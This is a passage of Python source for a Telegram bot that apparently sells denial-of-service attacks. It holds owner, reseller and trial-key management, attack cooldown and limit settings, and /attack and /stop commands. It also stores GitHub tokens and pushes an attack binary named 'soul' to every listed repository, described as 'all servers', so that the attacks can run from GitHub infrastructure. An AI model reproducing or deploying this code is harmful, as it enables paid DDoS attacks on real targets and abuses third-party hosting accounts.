    msg = "👥 **ᴀᴘᴘʀᴏᴠᴇᴅ ᴜsᴇʀs**\n" + "\n".join([f"• `{uid}` - {info.get('username')}" for uid, info in approved_users.items()])
    await update.message.reply_text(msg[:4096])

async def maintenance_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not is_owner(update.effective_user.id): return
    global MAINTENANCE_MODE
    if context.args and context.args[0].lower() == 'on': MAINTENANCE_MODE = True
    else: MAINTENANCE_MODE = False
    save_maintenance_mode(MAINTENANCE_MODE)
    await update.message.reply_text(f"🔧 ᴍᴀɪɴᴛᴇɴᴀɴᴄᴇ: {'ᴏɴ' if MAINTENANCE_MODE else 'ᴏғғ'}")

async def redeem_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not context.args:
        await update.message.reply_text("ᴜsᴀɢᴇ: /redeem <ᴋᴇʏ>")
        return
    success, msg = redeem_trial_key(context.args[0], update.effective_user.id)
    await update.message.reply_text(msg)

async def gentrailkey_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not (is_owner(update.effective_user.id) or is_admin(update.effective_user.id)): return
    hrs = int(context.args[0]) if context.args else 1
    key = generate_trial_key(hrs)
    await update.message.reply_text(f"🔑 **ᴛʀɪᴀʟ ᴋᴇʏ ({hrs}ʜ):**\n`{key}`")

async def broadcast_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not is_owner(update.effective_user.id): return
    await update.message.reply_text("sᴇɴᴅ ᴛʜᴇ ᴍᴇssᴀɢᴇ ᴛᴏ ʙʀᴏᴀᴅᴄᴀsᴛ:")
    return WAITING_FOR_BROADCAST

async def handle_broadcast_text(update: Update, context: ContextTypes.DEFAULT_TYPE):
    txt = update.message.text
    for uid in approved_users.keys():
        try: await context.bot.send_message(chat_id=int(uid), text=f"📢 **ʙʀᴏᴀᴅᴄᴀsᴛ**\n\n{txt}")
        except: pass
    await update.message.reply_text("✅ ʙʀᴏᴀᴅᴄᴀsᴛ sᴇɴᴛ")
    return ConversationHandler.END

async def setcooldown_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not is_owner(update.effective_user.id): return
    if context.args:
        global COOLDOWN_DURATION
        COOLDOWN_DURATION = int(context.args[0])
        save_cooldown(COOLDOWN_DURATION)
        await update.message.reply_text(f"✅ ᴄᴏᴏʟᴅᴏᴡɴ sᴇᴛ ᴛᴏ {COOLDOWN_DURATION}s")

async def setmaxattack_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not is_owner(update.effective_user.id): return
    if context.args:
        global MAX_ATTACKS
        MAX_ATTACKS = int(context.args[0])
        save_max_attacks(MAX_ATTACKS)
        await update.message.reply_text(f"✅ ᴍᴀx ᴀᴛᴛᴀᴄᴋs sᴇᴛ ᴛᴏ {MAX_ATTACKS}")

async def addtoken_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not is_owner(update.effective_user.id): return
    if len(context.args) != 2:
        await update.message.reply_text("ᴜsᴀɢᴇ: /addtoken <ᴛᴏᴋᴇɴ> <ʀᴇᴘᴏ_ɴᴀᴍᴇ>")
        return
    token, repo = context.args
    try:
        g = Github(token)
        user = g.get_user()
        github_tokens.append({"token": token, "repo": f"{user.login}/{repo}", "username": user.login})
        save_github_tokens(github_tokens)
        await update.message.reply_text(f"✅ ᴛᴏᴋᴇɴ ᴀᴅᴅᴇᴅ ғᴏʀ {user.login}")
    except: await update.message.reply_text("❌ ɪɴᴠᴀʟɪᴅ ᴛᴏᴋᴇɴ")

async def tokens_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not is_owner(update.effective_user.id): return
    msg = "🔑 **ɢɪᴛʜᴜʙ ᴛᴏᴋᴇɴs**\n" + "\n".join([f"• {t['username']} - {t['repo']}" for t in github_tokens])
    await update.message.reply_text(msg or "ɴᴏ ᴛᴏᴋᴇɴs")

async def removetoken_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not is_owner(update.effective_user.id): return
    if not context.args: return
    idx = int(context.args[0]) - 1
    if 0 <= idx < len(github_tokens):
        removed = github_tokens.pop(idx)
        save_github_tokens(github_tokens)
        await update.message.reply_text(f"✅ ʀᴇᴍᴏᴠᴇᴅ {removed['username']}")

async def removexpiredtoken_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not is_owner(update.effective_user.id): return
    valid = []
    for t in github_tokens:
        try: Github(t['token']).get_user().login; valid.append(t)
        except: pass
    github_tokens[:] = valid
    save_github_tokens(github_tokens)
    await update.message.reply_text("✅ ᴇxᴘɪʀᴇᴅ ᴛᴏᴋᴇɴs ʀᴇᴍᴏᴠᴇᴅ")

async def addowner_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not is_primary_owner(update.effective_user.id): return
    await update.message.reply_text("sᴇɴᴅ ɪᴅ ᴛᴏ ᴀᴅᴅ ᴀs ᴏᴡɴᴇʀ:")
    return WAITING_FOR_OWNER_ADD

async def handle_owner_add(update: Update, context: ContextTypes.DEFAULT_TYPE):
    oid = update.message.text
    owners[str(oid)] = {"username": f"owner_{oid}", "added_by": str(update.effective_user.id), "added_date": time.strftime("%Y-%m-%d"), "is_primary": False}
    save_owners(owners)
    await update.message.reply_text(f"✅ {oid} ᴀᴅᴅᴇᴅ ᴀs ᴏᴡɴᴇʀ")
    return ConversationHandler.END

async def deleteowner_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not is_primary_owner(update.effective_user.id): return
    await update.message.reply_text("sᴇɴᴅ ɪᴅ ᴛᴏ ʀᴇᴍᴏᴠᴇ:")
    return WAITING_FOR_OWNER_DELETE

async def handle_owner_delete(update: Update, context: ContextTypes.DEFAULT_TYPE):
    oid = update.message.text
    if oid in owners and not owners[oid].get('is_primary'):
        del owners[oid]; save_owners(owners)
        await update.message.reply_text(f"✅ {oid} ʀᴇᴍᴏᴠᴇᴅ")
    return ConversationHandler.END

async def addreseller_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not is_owner(update.effective_user.id): return
    await update.message.reply_text("sᴇɴᴅ ɪᴅ ᴛᴏ ᴀᴅᴅ ᴀs ʀᴇsᴇʟʟᴇʀ:")
    return WAITING_FOR_RESELLER_ADD

async def handle_reseller_add(update: Update, context: ContextTypes.DEFAULT_TYPE):
    rid = update.message.text
    resellers[str(rid)] = {"username": f"reseller_{rid}", "added_by": str(update.effective_user.id), "added_date": time.strftime("%Y-%m-%d"), "expiry": "LIFETIME"}
    save_resellers(resellers)
    await update.message.reply_text(f"✅ {rid} ᴀᴅᴅᴇᴅ ᴀs ʀᴇsᴇʟʟᴇʀ")
    return ConversationHandler.END

async def removereseller_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not is_owner(update.effective_user.id): return
    await update.message.reply_text("sᴇɴᴅ ɪᴅ ᴛᴏ ʀᴇᴍᴏᴠᴇ ʀᴇsᴇʟʟᴇʀ:")
    return WAITING_FOR_RESELLER_REMOVE

async def handle_reseller_remove(update: Update, context: ContextTypes.DEFAULT_TYPE):
    rid = update.message.text
    if rid in resellers: del resellers[rid]; save_resellers(resellers)
    await update.message.reply_text(f"✅ {rid} ʀᴇᴍᴏᴠᴇᴅ")
    return ConversationHandler.END

async def binary_upload_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not is_owner(update.effective_user.id): return
    await update.message.reply_text("ᴘʟᴇᴀsᴇ ᴜᴘʟᴏᴀᴅ ᴛʜᴇ 'soul' ʙɪɴᴀʀʏ:")
    return WAITING_FOR_BINARY

async def handle_binary_file(update: Update, context: ContextTypes.DEFAULT_TYPE):
    doc = update.message.document
    if doc.file_name != BINARY_FILE_NAME:
        await update.message.reply_text(f"❌ ɪɴᴠᴀʟɪᴅ ɴᴀᴍᴇ. ᴍᴜsᴛ ʙᴇ '{BINARY_FILE_NAME}'")
        return WAITING_FOR_BINARY
    
    file = await context.bot.get_file(doc.file_id)
    await file.download_to_drive(BINARY_FILE_NAME)
    
    with open(BINARY_FILE_NAME, 'rb') as f:
        content = f.read()
    
    for t in github_tokens:
        try:
            repo = Github(t['token']).get_repo(t['repo'])
            try: repo.update_file(BINARY_FILE_NAME, "Update binary", content, repo.get_contents(BINARY_FILE_NAME).sha)
            except: repo.create_file(BINARY_FILE_NAME, "Initial binary", content)
        except: pass
    
    await update.message.reply_text("✅ ʙɪɴᴀʀʏ ᴜᴘʟᴏᴀᴅᴇᴅ ᴛᴏ ᴀʟʟ sᴇʀᴠᴇʀs")
    return ConversationHandler.END

def main():
    application = Application.builder().token(BOT_TOKEN).build()

    conv_handler = ConversationHandler(
        entry_points=[
            CommandHandler("broadcast", broadcast_command),
            CommandHandler("binary_upload", binary_upload_command),
            CommandHandler("addowner", addowner_command),
            CommandHandler("deleteowner", deleteowner_command),
            CommandHandler("addreseller", addreseller_command),
            CommandHandler("removereseller", removereseller_command),
        ],
        states={
            WAITING_FOR_BROADCAST: [MessageHandler(filters.TEXT & ~filters.COMMAND, handle_broadcast_text)],
            WAITING_FOR_BINARY: [MessageHandler(filters.Document.ALL, handle_binary_file)],
            WAITING_FOR_OWNER_ADD: [MessageHandler(filters.TEXT & ~filters.COMMAND, handle_owner_add)],
            WAITING_FOR_OWNER_DELETE: [MessageHandler(filters.TEXT & ~filters.COMMAND, handle_owner_delete)],
            WAITING_FOR_RESELLER_ADD: [MessageHandler(filters.TEXT & ~filters.COMMAND, handle_reseller_add)],
            WAITING_FOR_RESELLER_REMOVE: [MessageHandler(filters.TEXT & ~filters.COMMAND, handle_reseller_remove)],
        },
        fallbacks=[],
    )

    application.add_handler(conv_handler)
    application.add_handler(CommandHandler("start", start))
    application.add_handler(CommandHandler("help", help_command))
    application.add_handler(CommandHandler("id", id_command))
    application.add_handler(CommandHandler("myaccess", myaccess_command))
    application.add_handler(CommandHandler("attack", attack_command))
    application.add_handler(CommandHandler("stop", stop_command))
    application.add_handler(CommandHandler("status", status_command))
    application.add_handler(CommandHandler("add", add_command))
    application.add_handler(CommandHandler("remove", remove_command))
    application.add_handler(CommandHandler("userslist", userslist_command))
    application.add_handler(CommandHandler("maintenance", maintenance_command))
    application.add_handler(CommandHandler("redeem", redeem_command))
    application.add_handler(CommandHandler("gentrailkey", gentrailkey_command))
    application.add_handler(CommandHandler("setcooldown", setcooldown_command))
    application.add_handler(CommandHandler("setmaxattack", setmaxattack_command))
    application.add_handler(CommandHandler("addtoken", addtoken_command))
    application.add_handler(CommandHandler("tokens", tokens_command))
    application.add_handler(CommandHandler("removetoken", removetoken_command))
    application.add_handler(CommandHandler("removexpiredtoken", removexpiredtoken_command))

    print("🤖 **ᴛʜᴇ ʙᴏᴛ ɪs ʀᴜɴɴɪɴɢ...**")
    application.run_polling()

if __name__ == '__main__':
    main()
